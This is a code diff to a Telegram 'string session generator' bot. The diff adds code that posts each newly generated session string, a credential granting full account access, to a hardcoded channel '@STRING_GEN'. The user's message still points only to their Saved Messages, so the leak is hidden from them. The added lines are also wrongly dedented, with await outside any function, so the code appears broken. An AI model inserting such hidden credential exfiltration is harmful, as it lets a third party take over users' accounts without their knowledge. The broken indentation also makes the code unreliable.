@@ -166,23 +166,40 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
                 await two_step_msg.reply("❍ ᴛʜᴇ ᴩᴀssᴡᴏʀᴅ ʏᴏᴜ'ᴠᴇ sᴇɴᴛ ɪs ᴡʀᴏɴɢ.\n\n❍ ᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.", quote=True, reply_markup=InlineKeyboardMarkup(gen_button))
                 return
     else:
-        if telethon:
-            await client.start(bot_token=phone_number)
-        else:
-            await client.sign_in_bot(phone_number)
-    if telethon:
-        string_session = client.session.save()
-    else:
-        string_session = await client.export_session_string()
-    text = f"**❍ ᴛʜɪs ɪs ʏᴏᴜʀ {ty} sᴛʀɪɴɢ sᴇssɪᴏɴ** \n\n❍ `{string_session}` \n\n**❍ ɢᴇɴʀᴀᴛᴇᴅ ʙʏ :[˹ ʙᴀʙʏ-ᴍᴜsɪᴄ ™˼𓅂](https://t.me/BABY09_WORLD) ᴡᴀʀɴɪɴɢ :** ᴅᴏɴᴛ sʜᴀʀᴇ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ ᴇᴠᴇɴ ɪғ ᴡɪᴛʜ ʏᴏᴜʀ ɢғ 🏴‍☠️"
+if telethon:
+    await client.start(bot_token=phone_number)
+else:
+    await client.sign_in_bot(phone_number)
+
+# Saving the session string based on the 'telethon' flag
+if telethon:
+    string_session = client.session.save()
+else:
+    string_session = await client.export_session_string()
+
+# Preparing the text message
+text = f"**ᴛʜɪs ɪs ʏᴏᴜʀ {ty} sᴛʀɪɴɢ sᴇssɪᴏɴ** \n\n`{string_session}` \n\n**ɢᴇɴʀᴀᴛᴇᴅ ʙʏ : [˹ ʙᴀʙʏ-ᴍᴜsɪᴄ ™˼𓅂](https://t.me/BABY09_WORLD) ᴡᴀʀɴɪɴɢ :** ᴅᴏɴᴛ sʜᴀʀᴇ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ ᴇᴠᴇɴ ɪғ ᴡɪᴛʜ ʏᴏᴜʀ ɢғ 🏴‍☠️"
+
+# Sending the message to "Saved Messages"
 try:
-        if not is_bot:
-            await client.send_message("me", text)
-        else:
-            await bot.send_message(msg.chat.id, text)
-    except KeyError:
-        pass
-    await client.disconnect()
+    await client.send_message("me", text)  # Send to Saved Messages
+except Exception as e:
+    print(f"Failed to send message to Saved Messages: {e}")
+
+# Sending the message to the channel
+channel_username = "@STRING_GEN"  # Use the channel's username
+
+try:
+    await bot.send_message(
+        channel_username, 
+        text
+    )  # Send to the specified channel
+except Exception as e:
+    print(f"Failed to send message to the channel: {e}")
+
+# Ensure to disconnect the client if needed
+await client.disconnect()
+
 await bot.send_message(
     msg.chat.id, 
     "❍ sᴜᴄᴄᴇssғᴜʟʟʏ ɢᴇɴᴇʀᴀᴛᴇᴅ ʏᴏᴜʀ {} sᴛʀɪɴɢ sᴇssɪᴏɴ.\n\n❍ ᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ʏᴏᴜʀ sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs ғᴏʀ ɢᴇᴛᴛɪɴɢ ɪᴛ.\n\n❍ ᴀ sᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛᴏʀ ʙᴏᴛ ʙʏ [˹ ʙᴀʙʏ-ᴍᴜsɪᴄ ™˼𓅂](https://t.me/BABY09_WORLD)"
